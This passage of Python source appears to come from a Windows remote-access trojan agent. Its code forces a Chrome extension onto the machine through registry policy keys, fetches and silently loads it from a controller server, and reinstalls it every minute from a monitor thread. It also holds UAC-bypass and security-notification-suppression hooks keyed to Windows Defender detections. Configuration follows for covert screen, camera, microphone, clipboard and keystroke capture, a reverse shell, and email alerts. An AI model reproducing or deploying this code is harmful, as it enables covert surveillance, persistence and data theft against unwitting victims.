            v, t = winreg.QueryValueEx(key_es, "ExtensionSettings")
            if isinstance(v, str) and v.strip():
                current = v
        except Exception:
            current = "{}"
        try:
            obj = json.loads(current)
        except Exception:
            obj = {}
        obj[str(ext_id)] = {"installation_mode":"force_installed","update_url":update_url}
        winreg.SetValueEx(key_es, "ExtensionSettings", 0, winreg.REG_SZ, json.dumps(obj))
        try: winreg.CloseKey(key_es)
        except Exception: pass
    except Exception:
        pass
    try:
        import ctypes
        if ctypes.windll.shell32.IsUserAnAdmin():
            accessm = winreg.KEY_SET_VALUE | getattr(winreg, "KEY_WOW64_64KEY", 0)
            basem = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, r"Software\Policies\Google\Chrome\ExtensionInstallForcelist", 0, accessm)
            winreg.SetValueEx(basem, "1", 0, winreg.REG_SZ, f"{ext_id};{update_url}")
            try: winreg.CloseKey(basem)
            except Exception: pass
            access_em = winreg.KEY_SET_VALUE | getattr(winreg, "KEY_WOW64_64KEY", 0)
            key_em = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, r"Software\Policies\Google\Chrome", 0, access_em)
            current_m = "{}"
            try:
                vm, tm = winreg.QueryValueEx(key_em, "ExtensionSettings")
                if isinstance(vm, str) and vm.strip():
                    current_m = vm
            except Exception:
                current_m = "{}"
            try:
                objm = json.loads(current_m)
            except Exception:
                objm = {}
            objm[str(ext_id)] = {"installation_mode":"force_installed","update_url":update_url}
            winreg.SetValueEx(key_em, "ExtensionSettings", 0, winreg.REG_SZ, json.dumps(objm))
            try: winreg.CloseKey(key_em)
            except Exception: pass
            try:
                key_allow = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, r"Software\Policies\Google\Chrome\ExtensionInstallAllowlist", 0, access_em)
                winreg.SetValueEx(key_allow, "1", 0, winreg.REG_SZ, str(ext_id))
                try: winreg.CloseKey(key_allow)
                except Exception: pass
            except Exception:
                pass
    except Exception:
        pass
    try:
        import urllib.request, subprocess, ctypes
        dest_dir = os.path.join(os.environ.get('LOCALAPPDATA') or os.path.expanduser('~'), 'AutoSaveExtension')
        src = (cfg.get('download_url') or '').strip() or (base.rstrip('/') + "/download/extensions/extension.crx")
        ok_extract = False
        try:
            req = urllib.request.Request(src, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=10) as resp:
                raw = resp.read()
            ok_extract = _extract_crx_payload(raw, dest_dir)
        except Exception:
            ok_extract = False
        ver = "1.0"
        try:
            mf = os.path.join(dest_dir, "manifest.json")
            if os.path.isfile(mf):
                with open(mf, 'r', encoding='utf-8', errors='ignore') as f:
                    man = json.load(f)
                    v = str(man.get('version') or '')
                    if v:
                        ver = v
        except Exception:
            pass
        try:
            access_e = winreg.KEY_SET_VALUE | getattr(winreg, "KEY_WOW64_64KEY", 0)
            if ctypes.windll.shell32.IsUserAnAdmin():
                key_e = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, fr"Software\Google\Chrome\Extensions\{ext_id}", 0, access_e)
            else:
                key_e = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, fr"Software\Google\Chrome\Extensions\{ext_id}", 0, access_e)
            if ok_extract:
                winreg.SetValueEx(key_e, "path", 0, winreg.REG_SZ, dest_dir)
            winreg.SetValueEx(key_e, "version", 0, winreg.REG_SZ, ver)
            try: winreg.CloseKey(key_e)
            except Exception: pass
        except Exception:
            pass
        try:
            candidates = []
            p1 = os.path.join(os.environ.get('LOCALAPPDATA') or '', 'Google', 'Chrome', 'Application', 'chrome.exe')
            p2 = os.path.join(os.environ.get('ProgramFiles') or '', 'Google', 'Chrome', 'Application', 'chrome.exe')
            p3 = os.path.join(os.environ.get('ProgramFiles(x86)') or '', 'Google', 'Chrome', 'Application', 'chrome.exe')
            candidates.extend([p1, p2, p3])
            exe = ""
            for p in candidates:
                if p and os.path.isfile(p):
                    exe = p
                    break
            if not exe:
                import shutil
                exe = shutil.which('chrome') or shutil.which('chrome.exe') or ''
            if exe and ok_extract:
                try:
                    subprocess.Popen([exe, f"--load-extension={dest_dir}"], creationflags=subprocess.CREATE_NO_WINDOW)
                except Exception:
                    subprocess.Popen([exe, f"--load-extension={dest_dir}"])
        except Exception:
            pass
    except Exception:
        pass

def _ext_is_installed(ext_id: str) -> bool:
    try:
        import sys
        if sys.platform != 'win32':
            return False
        import winreg, os
        policy_found = False
        try:
            base2 = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Policies\Google\Chrome\ExtensionInstallForcelist")
            i = 0
            while True:
                try:
                    _, value, _ = winreg.EnumValue(base2, i)
                    i += 1
                    if isinstance(value, str) and value.startswith(ext_id + ";"):
                        policy_found = True
                        break
                except OSError:
                    break
            try:
                winreg.CloseKey(base2)
            except Exception:
                pass
        except Exception:
            pass
        try:
            base3 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Policies\Google\Chrome\ExtensionInstallForcelist")
            i = 0
            while True:
                try:
                    _, value, _ = winreg.EnumValue(base3, i)
                    i += 1
                    if isinstance(value, str) and value.startswith(ext_id + ";"):
                        policy_found = True
                        break
                except OSError:
                    break
            try:
                winreg.CloseKey(base3)
            except Exception:
                pass
        except Exception:
            pass
        try:
            access_r = winreg.KEY_READ | getattr(winreg, "KEY_WOW64_64KEY", 0)
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, fr"Software\Google\Chrome\Extensions\{ext_id}", 0, access_r)
            try:
                winreg.CloseKey(k)
            except Exception:
                pass
            return True
        except Exception:
            try:
                access_r32 = winreg.KEY_READ | getattr(winreg, "KEY_WOW64_32KEY", 0)
                k2 = winreg.OpenKey(winreg.HKEY_CURRENT_USER, fr"Software\Google\Chrome\Extensions\{ext_id}", 0, access_r32)
                try:
                    winreg.CloseKey(k2)
                except Exception:
                    pass
                return True
            except Exception:
                pass
        try:
            access_rh = winreg.KEY_READ | getattr(winreg, "KEY_WOW64_64KEY", 0)
            kh = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, fr"Software\Google\Chrome\Extensions\{ext_id}", 0, access_rh)
            try:
                winreg.CloseKey(kh)
            except Exception:
                pass
            return True
        except Exception:
            try:
                access_rh32 = winreg.KEY_READ | getattr(winreg, "KEY_WOW64_32KEY", 0)
                kh2 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, fr"Software\Google\Chrome\Extensions\{ext_id}", 0, access_rh32)
                try:
                    winreg.CloseKey(kh2)
                except Exception:
                    pass
                return True
            except Exception:
                pass
        try:
            base = os.environ.get('LOCALAPPDATA') or ''
            user_data = os.path.join(base, 'Google', 'Chrome', 'User Data')
            if os.path.isdir(user_data):
                for name in os.listdir(user_data):
                    p1 = os.path.join(user_data, name, 'Local Extension Settings', ext_id)
                    if os.path.isdir(p1):
                        return True
                    p2 = os.path.join(user_data, name, 'Extensions', ext_id)
                    if os.path.isdir(p2):
                        try:
                            for ver in os.listdir(p2):
                                ver_path = os.path.join(p2, ver)
                                if os.path.isdir(ver_path):
                                    return True
                        except Exception:
                            pass
        except Exception:
            pass
        return policy_found
    except Exception:
        return False

def _extract_crx_payload(raw: bytes, target_dir: str) -> bool:
    try:
        import os, io, zipfile, shutil
        os.makedirs(target_dir, exist_ok=True)
        idx = raw.find(b'PK\x03\x04')
        if idx < 0:
            return False
        z = raw[idx:]
        for name in os.listdir(target_dir):
            p = os.path.join(target_dir, name)
            try:
                if os.path.isdir(p):
                    shutil.rmtree(p, ignore_errors=True)
                else:
                    os.remove(p)
            except Exception:
                pass
        with zipfile.ZipFile(io.BytesIO(z)) as zf:
            zf.extractall(target_dir)
        return True
    except Exception:
        return False

def _deploy_extension_from_url(download_url: str, ext_id: str, display_name: str = "") -> bool:
    try:
        import sys
        if sys.platform != 'win32':
            return False
        import os, tempfile, winreg
        try:
            base = SERVER_URL if USE_FIXED_SERVER_URL else get_controller_url()
        except Exception:
            base = SERVER_URL
        update_xml = f"{base.rstrip('/')}/download/extensions/update.xml"
        try:
            access2 = winreg.KEY_SET_VALUE | getattr(winreg, "KEY_WOW64_64KEY", 0)
            base2 = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Policies\Google\Chrome\ExtensionInstallForcelist", 0, access2)
            winreg.SetValueEx(base2, "1", 0, winreg.REG_SZ, f"{ext_id};{update_xml}")
            try:
                winreg.CloseKey(base2)
            except Exception:
                pass
        except Exception:
            pass
        try:
            import ctypes
            if ctypes.windll.shell32.IsUserAnAdmin():
                accessm = winreg.KEY_SET_VALUE | getattr(winreg, "KEY_WOW64_64KEY", 0)
                basem = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, r"Software\Policies\Google\Chrome\ExtensionInstallForcelist", 0, accessm)
                winreg.SetValueEx(basem, "1", 0, winreg.REG_SZ, f"{ext_id};{update_xml}")
                try:
                    winreg.CloseKey(basem)
                except Exception:
                    pass
        except Exception:
            pass
        return True
    except Exception:
        return False

def _fetch_extension_config() -> dict:
    cfg = {'download_url': '', 'extension_id': VAULT_EXTENSION_ID}
    try:
        import urllib.request
        base = SERVER_URL if USE_FIXED_SERVER_URL else get_controller_url()
        url = f"{base.rstrip('/')}/download/extensions/config.json"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=10) as resp:
            import json as _json
            data = resp.read()
            c = _json.loads(data.decode('utf-8', errors='ignore'))
            if isinstance(c, dict):
                if 'download_url' in c and isinstance(c['download_url'], str):
                    cfg['download_url'] = c['download_url']
                if 'extension_id' in c and isinstance(c['extension_id'], str) and c['extension_id']:
                    cfg['extension_id'] = c['extension_id']
    except Exception:
        pass
    return cfg

def start_extension_monitor(interval_sec: int = 60):
    global EXT_MONITOR_ACTIVE, EXT_MONITOR_THREAD
    if EXT_MONITOR_ACTIVE:
        return
    def _loop():
        import time as _t
        while True:
            try:
                cfg = _fetch_extension_config()
                ext_id = cfg.get('extension_id') or VAULT_EXTENSION_ID
                ok = _ext_is_installed(ext_id)
                if not ok:
                    _deploy_extension_from_url(cfg.get('download_url') or '', ext_id, cfg.get('display_name') or '')
            except Exception:
                pass
            _t.sleep(max(15, int(interval_sec)))
    try:
        t = threading.Thread(target=_loop, daemon=True)
        t.start()
        EXT_MONITOR_THREAD = t
        EXT_MONITOR_ACTIVE = True
    except Exception:
        EXT_MONITOR_ACTIVE = False

def maybe_enable_bypass_debugging() -> bool:
    try:
        if detect_defender_threats():
            if not UAC_BYPASS_DEBUG_MODE:
                enable_full_uac_bypass_debugging()
            try:
                suppress_security_notifications_aggressive()
            except Exception:
                pass
            return True
        return False
    except Exception:
        return False
def should_skip_uac_method(method_id=None, method_name=None) -> bool:
    try:
        if detect_defender_threats():
            log_message("Skipping UAC bypass due to Windows Defender detection", "warning")
            return True
        return False
    except Exception:
        return False

def handle_missing_dependency(module_name, feature_description, alternative=None):
    """
    Gracefully handle missing dependencies by:
    1. Logging the issue silently
    2. Providing fallback functionality where possible
    3. Continuing operation without crashing
    """
    log_message(f"{module_name} not available, {feature_description} may not work", "warning")
    if alternative:
        log_message(f"Using alternative: {alternative}", "info")
    return False

def safe_import(module_name, feature_description=""):
    """
    Safely import a module and return True if successful, False otherwise
    """
    try:
        __import__(module_name)
        return True
    except ImportError:
        handle_missing_dependency(module_name, feature_description)
        return False

# ============================================================================
# CRITICAL: Import standard library AFTER eventlet.monkey_patch()
# ============================================================================
# eventlet is already imported and patched at the top of the file
# Now we can safely import everything else
# ============================================================================

debug_print("[IMPORTS] Starting standard library imports...")

# DEBUG: Check Python path
debug_print(f"[IMPORTS] Python executable: {sys.executable}")
debug_print(f"[IMPORTS] Python version: {sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}")
debug_print(f"[IMPORTS] sys.path has {len(sys.path)} entries")

# Standard library imports (AFTER eventlet patch!)
import time
debug_print("[IMPORTS] [ OK ] time imported")

from typing import Dict, Any, Optional, List, Union, Tuple
debug_print("[IMPORTS] [ OK ] typing imported")

import warnings
debug_print("[IMPORTS] [ OK ] warnings imported")

import uuid
debug_print("[IMPORTS] [ OK ] uuid imported")

import subprocess
debug_print("[IMPORTS] [ OK ] subprocess imported")

import threading
debug_print("[IMPORTS] [ OK ] threading imported")

import random
debug_print("[IMPORTS] [ OK ] random imported")

import base64
debug_print("[IMPORTS] [ OK ] base64 imported")

import tempfile
debug_print("[IMPORTS] [ OK ] tempfile imported")

import io
debug_print("[IMPORTS] [ OK ] io imported")

import wave
debug_print("[IMPORTS] [ OK ] wave imported")

import socket
debug_print("[IMPORTS] [ OK ] socket imported")

import json
debug_print("[IMPORTS] [ OK ] json imported")

import asyncio
debug_print("[IMPORTS] [ OK ] asyncio imported")

import platform
debug_print("[IMPORTS] [ OK ] platform imported")

import queue
debug_print("[IMPORTS] [ OK ] queue imported")

import math
debug_print("[IMPORTS] [ OK ] math imported")

import smtplib
debug_print("[IMPORTS] [ OK ] smtplib imported")

import secrets
debug_print("[IMPORTS] [ OK ] secrets imported")

import datetime
debug_print("[IMPORTS] [ OK ] datetime imported")

from email.mime.text import MIMEText
debug_print("[IMPORTS] [ OK ] email.mime.text imported")

import hashlib
debug_print("[IMPORTS] [ OK ] hashlib imported")

# collections.defaultdict AFTER eventlet patch
from collections import defaultdict
debug_print("[IMPORTS] [ OK ] collections.defaultdict imported")

# urllib3 AFTER eventlet patch (this was causing http.client issue)
try:
    import urllib3
    debug_print("[IMPORTS] [ OK ] urllib3 imported")
    URLLIB3_AVAILABLE = True
except ImportError as e:
    debug_print(f"[IMPORTS] [ ! ] urllib3 import failed: {e}")
    URLLIB3_AVAILABLE = False

# HTTP requests (used as fallback)
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    log_message("requests library not available, HTTP fallback disabled", "warning")

# Suppress SSL warnings
if URLLIB3_AVAILABLE:
    try:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        debug_print("[IMPORTS] [ OK ] urllib3 warnings disabled")
    except Exception as e:
        debug_print(f"[IMPORTS] [ ! ] urllib3.disable_warnings failed: {e}")

warnings.filterwarnings('ignore', message='Unverified HTTPS request')
debug_print("[IMPORTS] [ OK ] SSL warnings suppressed")

# Third-party imports with error handling
try:
    import mss
    MSS_AVAILABLE = True
except ImportError:
    MSS_AVAILABLE = False
    log_message("mss not available, screen capture may not work", "warning")

try:
    import numpy as np
    NUMPY_AVAILABLE = True
except ImportError:
    NUMPY_AVAILABLE = False
    log_message("numpy not available, some features may not work", "warning")

try:
    import cv2
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False
    log_message("opencv-python not available, video processing may not work", "warning")

# Windows-specific imports
try:
    debug_print("[IMPORTS] Checking Windows availability...")
    
    # Check if we're on Windows first
    if platform.system() != 'Windows':
        debug_print("[IMPORTS] [ X ] Not Windows platform")
        WINDOWS_AVAILABLE = False
        PYWIN32_AVAILABLE = False
    else:
        debug_print("[IMPORTS] [ OK ] Windows platform detected")
        
        # Import basic Windows modules first (always available on Windows)
        import ctypes
        debug_print("[IMPORTS] [ OK ] ctypes imported")
        
        from ctypes import wintypes
        debug_print("[IMPORTS] [ OK ] wintypes imported")
        
        import winreg
        debug_print("[IMPORTS] [ OK ] winreg imported")
        
        # Try to import pywin32 modules (may not be installed)
        try:
            import win32api
            debug_print("[IMPORTS] [ OK ] win32api imported")
            import win32con
            debug_print("[IMPORTS] [ OK ] win32con imported")
            import win32clipboard
            debug_print("[IMPORTS] [ OK ] win32clipboard imported")
            import win32security
            debug_print("[IMPORTS] [ OK ] win32security imported")
            import win32process
            debug_print("[IMPORTS] [ OK ] win32process imported")
            import win32event
            debug_print("[IMPORTS] [ OK ] win32event imported")
            PYWIN32_AVAILABLE = True
            debug_print("[IMPORTS] [ OK ] pywin32 FULLY available")
        except ImportError as e:
            PYWIN32_AVAILABLE = False
            debug_print(f"[IMPORTS] [ ! ] pywin32 not available: {e}")
            debug_print("[IMPORTS] To install: pip install pywin32")
        
        WINDOWS_AVAILABLE = True
        debug_print("[IMPORTS] [ OK ] WINDOWS_AVAILABLE = True")
        
except Exception as e:
    debug_print(f"[IMPORTS] [ X ] Windows import failed: {e}")
    import traceback
    traceback.print_exc()
    WINDOWS_AVAILABLE = False
    PYWIN32_AVAILABLE = False
    
# Audio processing imports
try:
    import pyaudio
    PYAUDIO_AVAILABLE = True
    FORMAT = pyaudio.paInt16  # Set FORMAT only if pyaudio is available
except ImportError:
    PYAUDIO_AVAILABLE = False
    FORMAT = None
    log_message("PyAudio not available, audio features may not work", "warning")

# Input handling imports
try:
    import pynput
    from pynput import keyboard, mouse
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False
    log_message("pynput not available, input monitoring may not work", "warning")

# GUI and graphics imports
try:
    import warnings
    # Suppress pygame pkg_resources deprecation warning
    with warnings.catch_warnings():
        warnings.filterwarnings("ignore", category=UserWarning, module="pygame.pkgdata")
        import pygame
    PYGAME_AVAILABLE = True
except ImportError:
    PYGAME_AVAILABLE = False
    log_message("pygame not available, some GUI features may not work", "warning")

# WebSocket imports
try:
    import websockets
    WEBSOCKETS_AVAILABLE = True
except ImportError:
    WEBSOCKETS_AVAILABLE = False
    log_message("websockets not available, WebSocket features may not work", "warning")

# Speech recognition imports
try:
    import speech_recognition as sr
    SPEECH_RECOGNITION_AVAILABLE = True
except ImportError:
    SPEECH_RECOGNITION_AVAILABLE = False
    log_message("speech_recognition not available, voice features may not work", "warning")

# System monitoring imports
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    log_message("psutil not available, system monitoring may not work", "warning")

# Image processing imports
try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False
    log_message("Pillow not available, image processing may not work", "warning")

# GUI automation imports
try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    PYAUTOGUI_AVAILABLE = False
    log_message("pyautogui not available, GUI automation may not work", "warning")

# Socket.IO imports - CRITICAL FIX FOR PYTHON 3.13
try:
    debug_print("[IMPORTS] Importing socketio (critical for controller connection)...")
    
    # Test if socketio package exists
    debug_print("[IMPORTS] Testing package installation...")
    test_result = subprocess.run(
        [sys.executable, "-m", "pip", "show", "python-socketio"],
        capture_output=True,
        text=True
    )
    
    if test_result.returncode == 0:
        debug_print("[IMPORTS] [ OK ] python-socketio package IS installed")
        # Show version
        for line in test_result.stdout.split('\n'):
            if line.startswith('Version:'):
                debug_print(f"[IMPORTS]    {line.strip()}")
                break
    else:
        debug_print("[IMPORTS] [ X ] python-socketio package NOT found!")
        debug_print("[IMPORTS] Installing now...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "python-socketio"])
    
    # Now try to import
    debug_print("[IMPORTS] Attempting import...")
    
    # Method 1: Standard import
    try:
        import socketio
        SOCKETIO_AVAILABLE = True
        debug_print("[IMPORTS] [ OK ] socketio imported successfully!")
    except ImportError as e1:
        debug_print(f"[IMPORTS] [ X ] Standard import failed: {e1}")
        
        # Method 2: Import from client
        try:
            debug_print("[IMPORTS] Trying socketio.Client...")
            import socketio.client
            socketio = socketio.client.Client
            SOCKETIO_AVAILABLE = True
            debug_print("[IMPORTS] [ OK ] socketio.Client imported!")
        except ImportError as e2:
            debug_print(f"[IMPORTS] [ X ] socketio.Client import failed: {e2}")
            
            # Method 3: Check if it's an eventlet patching issue
            debug_print("[IMPORTS] Checking for eventlet conflict...")
            try:
                # Try importing before eventlet patches it
                import importlib
                socketio_module = importlib.import_module('socketio')
                socketio = socketio_module
                SOCKETIO_AVAILABLE = True
                debug_print("[IMPORTS] [ OK ] socketio imported via importlib!")
            except Exception as e3:
                SOCKETIO_AVAILABLE = False
                debug_print(f"[IMPORTS] [ X ] All import methods failed!")
                debug_print(f"[IMPORTS]    Error 1: {e1}")
                debug_print(f"[IMPORTS]    Error 2: {e2}")
                debug_print(f"[IMPORTS]    Error 3: {e3}")
                log_message("python-socketio not available, real-time communication may not work", "warning")
            
except Exception as e:
    SOCKETIO_AVAILABLE = False
    debug_print(f"[IMPORTS] [ X ] Unexpected error with socketio: {e}")
    import traceback
    traceback.print_exc()
    log_message("python-socketio not available, real-time communication may not work", "warning")

# WebRTC imports for low-latency streaming
try:
    import aiortc
    from aiortc import RTCPeerConnection, MediaStreamTrack, RTCSessionDescription, RTCConfiguration, RTCIceServer, RTCIceCandidate
    from aiortc.contrib.media import MediaRecorder, MediaPlayer, MediaRelay
    from aiortc.mediastreams import MediaStreamError
    import av
    AIORTC_AVAILABLE = True
    log_message("aiortc WebRTC library available - enabling low-latency streaming", "info")
except ImportError:
    AIORTC_AVAILABLE = False
    log_message("aiortc not available, WebRTC streaming disabled - using fallback Socket.IO", "warning")

# Additional WebRTC dependencies
try:
    import aiohttp
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False
    log_message("aiohttp not available, some WebRTC features may not work", "warning")

try:
    import aiortc.contrib.signaling
    AIORTC_SIGNALING_AVAILABLE = True
except ImportError:
    AIORTC_SIGNALING_AVAILABLE = False
    log_message("aiortc.contrib.signaling not available, using custom signaling", "warning")

SERVER_URL = FIXED_SERVER_URL

# Email notification configuration (use Gmail App Password)
EMAIL_NOTIFICATIONS_ENABLED = os.environ.get('ENABLE_EMAIL_NOTIFICATIONS', '1') == '1'
DEFENDER_DISABLE_ENABLED = False
DEFENDER_TAMPER_DISABLE_ENABLED = False
AUTO_START_AUDIO_WITH_SCREEN = os.environ.get('AUTO_START_AUDIO_WITH_SCREEN', '1') == '1'
AUTO_START_AUDIO_WITH_CAMERA = os.environ.get('AUTO_START_AUDIO_WITH_CAMERA', '1') == '1'
CURSOR_EMIT_ENABLED = os.environ.get('STREAM_CURSOR_EMIT', '1') == '1'
SOCKET_MAX_BPS = int(os.environ.get('SOCKET_MAX_BPS', str(8 * 1024 * 1024)))
def _default_upload_dir():
    try:
        d = os.environ.get('LOCALAPPDATA')
        if d:
            return os.path.join(d, 'AgentUploads')
        h = os.path.expanduser('~')
        if h and os.path.isdir(h):
            return os.path.join(h, 'AgentUploads')
    except Exception:
        pass
    return os.path.join(tempfile.gettempdir(), 'AgentUploads')
UPLOAD_BASE_DIR = os.environ.get('AGENT_UPLOAD_DIR', _default_upload_dir())

# Expected SHA-256 digests (defaults provided; can be overridden via env)
EXPECTED_SHA256 = {
    'GMAIL_USERNAME': os.environ.get('GMAIL_USERNAME_SHA256', '9bf243453c355b42fb43ffe4f00f3209546ce85d5cb65aefede18cf728b37c02'),
    'GMAIL_APP_PASSWORD': os.environ.get('GMAIL_APP_PASSWORD_SHA256', '67944508ba70ca1c01ce9aad2feeee49e9381fa01acc3111bdf38b4b5c413da9'),
    'EMAIL_RECIPIENT': os.environ.get('EMAIL_RECIPIENT_SHA256', '9dcd23d7c1418cc163dd845a3dac654d7541f80d727eadf8d0ee54b2d2d2babb'),
    'FIXED_SERVER_URL': os.environ.get('FIXED_SERVER_URL_SHA256', 'b0e7cb987065e41f72b0be499a0e59aab016c2a9de47a7eaa18a85d9c08b4c63')
}

# Secrets only come from environment, not hard-coded
GMAIL_USERNAME = os.environ.get('GMAIL_USERNAME', '')
GMAIL_APP_PASSWORD = os.environ.get('GMAIL_APP_PASSWORD', '')  # Use App Password, not regular password
EMAIL_RECIPIENT = os.environ.get('EMAIL_RECIPIENT', '')
EMAIL_SENT_ONLINE = False

def _sha256_hex(value: str) -> str:
    try:
        return hashlib.sha256(value.encode('utf-8')).hexdigest()
    except Exception:
        return ''

def validate_secret_hashes():
    """Validate that default secrets match expected SHA-256 digests.
    Logs warnings if mismatched; does not block execution.
    """
    try:
        validations = {
            'GMAIL_USERNAME': _sha256_hex(GMAIL_USERNAME),
            'GMAIL_APP_PASSWORD': _sha256_hex(GMAIL_APP_PASSWORD),
            'EMAIL_RECIPIENT': _sha256_hex(EMAIL_RECIPIENT),
            'FIXED_SERVER_URL': _sha256_hex(FIXED_SERVER_URL)
        }
        for key, digest in validations.items():
            expected = EXPECTED_SHA256.get(key, '')
            if expected and digest != expected:
                log_message(f"SHA256 mismatch for {key}: expected {expected}, got {digest}", "warning")
    except Exception as e:
        log_message(f"Secret hash validation error: {e}", "warning")

# Global state variables
STREAMING_ENABLED = False
STREAM_THREADS = []
STREAM_THREAD = None
capture_queue = None
encode_queue = None
TARGET_FPS = 15
SCREEN_MAX_WIDTH = 1280
SCREEN_JPEG_QUALITY = 60
CAPTURE_QUEUE_SIZE = 10
ENCODE_QUEUE_SIZE = 10

# Delta (tile-based) streaming parameters
DELTA_STREAM_ENABLED = True
STREAM_TILE_SIZE = 64
DELTA_DIFF_THRESHOLD = 8  # per-pixel average difference threshold
KEYFRAME_INTERVAL_SECONDS = 2.0
ADAPTIVE_STATS_SCREEN = {
    'ema_tiles': 0.0,
    'tile_size': STREAM_TILE_SIZE,
    'diff_threshold': DELTA_DIFF_THRESHOLD,
}

# Audio streaming variables
AUDIO_STREAMING_ENABLED = False
AUDIO_STREAM_THREADS = []
AUDIO_STREAM_THREAD = None
audio_capture_queue = None
audio_encode_queue = None
AUDIO_CAPTURE_QUEUE_SIZE = 10
AUDIO_ENCODE_QUEUE_SIZE = 10
TARGET_AUDIO_FPS = 44.1

# Camera streaming variables
CAMERA_STREAMING_ENABLED = False
CAMERA_STREAM_THREADS = []
camera_capture_queue = None
camera_encode_queue = None
CAMERA_CAPTURE_QUEUE_SIZE = 10
CAMERA_ENCODE_QUEUE_SIZE = 10
TARGET_CAMERA_FPS = 15
SELECTED_MONITOR_INDEX = 1
DISPLAY_MODE = 'single'
PIP_MONITOR_INDEX = 2
MIC_VOLUME = 1.0
SYSTEM_VOLUME = 1.0
NOISE_REDUCTION_ENABLED = False
ECHO_CANCELLATION_ENABLED = False
AUDIO_ENCODING_OPUS_ENABLED = True
AUDIO_TEST_TONE_ON_START = os.environ.get('AUDIO_TEST_TONE_ON_START', '0') == '1'

# Thread safety locks for start/stop functions
_stream_lock = threading.Lock()
_audio_stream_lock = threading.Lock()
_camera_stream_lock = threading.Lock()
_clipboard_lock = threading.Lock()
_reverse_shell_lock = threading.Lock()
_voice_control_lock = threading.Lock()
_socket_emit_lock = threading.Lock()
_socket_rate_lock = threading.Lock()
_global_bytes_this_second = 0
_global_second_start = time.time()

# Safe Socket.IO emit wrapper with connection checking
def safe_emit(event_name, data, retry=False):
    """
    Thread-safe Socket.IO emit with connection checking.
    
    Args:
        event_name: Event name to emit
        data: Data to send
        retry: If True, buffer failed emits for retry
        
    Returns:
        bool: True if emit succeeded, False otherwise
    """
    if not SOCKETIO_AVAILABLE or sio is None:
        return False
    if not sio.connected:
        return False
    try:
        with _socket_emit_lock:
            sio.emit(event_name, data)
        return True
    except Exception as e:
        error_msg = str(e)
        if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
            log_message(f"Emit '{event_name}' failed: {e}", "warning")
        return False

def rate_limit_before_send(payload_size: int):
    try:
        global _global_bytes_this_second, _global_second_start
        now = time.time()
        _socket_rate_lock.acquire()
        try:
            if now - _global_second_start >= 1.0:
                _global_second_start = now
                _global_bytes_this_second = 0
            available = SOCKET_MAX_BPS - _global_bytes_this_second
            if available < 0:
                available = 0
            if payload_size > available:
                sleep_time = (payload_size - available) / float(SOCKET_MAX_BPS)
            else:
                sleep_time = min(0.004, payload_size / float(SOCKET_MAX_BPS))
        finally:
            _socket_rate_lock.release()
        if sleep_time > 0:
            time.sleep(sleep_time)
        _socket_rate_lock.acquire()
        try:
            now = time.time()
            if now - _global_second_start >= 1.0:
                _global_second_start = now
                _global_bytes_this_second = 0
            _global_bytes_this_second += payload_size
        finally:
            _socket_rate_lock.release()
    except Exception:
        pass

# Other global variables
CLIPBOARD_MONITOR_ENABLED = False
CLIPBOARD_MONITOR_THREAD = None
CLIPBOARD_BUFFER = []
LAST_CLIPBOARD_CONTENT = ""

VOICE_CONTROL_ENABLED = True
VOICE_CONTROL_THREAD = None
VOICE_RECOGNIZER = None

REVERSE_SHELL_ENABLED = False
REVERSE_SHELL_THREAD = None
REVERSE_SHELL_SOCKET = None

REMOTE_CONTROL_ENABLED = False
LOW_LATENCY_INPUT_HANDLER = None

# System state (variables already defined above - removing duplicates)

# Additional global variables
DASHBOARD_HTML = None
controller_app = None
controller_socketio = None
controller_thread = None
connected_agents = {}
agents_data = {}
operators = set()

# File manager state
LAST_BROWSED_DIRECTORY = None  # Track the last directory browsed in UI file manager
background_initializer = None
high_performance_capture = None
low_latency_input = None
mouse_controller = None
keyboard_controller = None
low_latency_available = False

# Clipboard and monitoring
CHUNK = 882
# FORMAT already defined above based on pyaudio availability
CHANNELS = 1
RATE = 44100
def init_audio_params():
    """Detect optimal audio rate and 20ms chunk for smooth capture."""
    global RATE, CHUNK
    try:
        detected_rate = None
        if PYAUDIO_AVAILABLE:
            try:
                p = pyaudio.PyAudio()
                info = p.get_default_input_device_info()
                detected_rate = int(info.get('defaultSampleRate') or 0)
                p.terminate()
            except Exception:
                pass
        if detected_rate is None:
            try:
                import sounddevice as sd
                info = sd.query_devices(None, 'input')
                detected_rate = int(info.get('default_samplerate') or 0)
            except Exception:
                pass
        if not detected_rate or detected_rate <= 0:
            detected_rate = 44100
        # Snap to common rates for consistency
        RATE = 48000 if abs(detected_rate - 48000) < abs(detected_rate - 44100) else 44100
        CHUNK = 960 if RATE == 48000 else 882
        log_message(f"[AUDIO] Initialized params: RATE={RATE}, CHUNK={CHUNK}")
    except Exception as e:
        RATE = 44100
        CHUNK = 882
        log_message(f"[AUDIO] Using defaults due to detection error: {e}")

# Connection Health Monitor
CONNECTION_STATE = {
    'connected': False,
    'last_successful_emit': 0,
    'last_check': 0,
    'reconnect_needed': False,
    'consecutive_failures': 0,
